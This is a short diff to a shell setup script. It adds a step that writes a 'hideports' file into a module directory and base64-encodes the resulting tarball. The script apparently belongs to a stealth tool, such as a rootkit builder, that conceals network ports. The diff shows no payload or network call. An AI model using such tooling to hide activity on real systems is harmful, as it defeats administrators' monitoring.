@@ -114,6 +114,8 @@ setup_configuration(){
     necho "Overwriting old variable placeholders"
     for selem in ${settings[@]}; do overwrite_placeholder "$selem" "${headers[*]}"; done
 
+    write_hideports $NEW_MDIR/hideports
+
     if [ $DOCOMPRESS == 1 ]; then
         [ ! -f `bin_path tar` ] && { eecho "Couldn't locate 'tar' on this machine."; exit; }
         echo; secho "Beginning compression of $NEW_MDIR"
@@ -126,6 +128,12 @@ setup_configuration(){
         sleep 1
         tar cpfz $tarname $NEW_MDIR && \
             secho "Finished compressing successfully" || \
-            eecho "Failure trying to compress with tar (gzip)"
+                eecho "Failure trying to compress with tar (gzip)"
+
+        [ ! -f $tarname ] && return
+
+        local tarb64="$NEW_MDIR.b64"
+        necho "Writing $tarname into $tarb64"
+        cat $tarname | base64 > $tarb64
     fi
 }
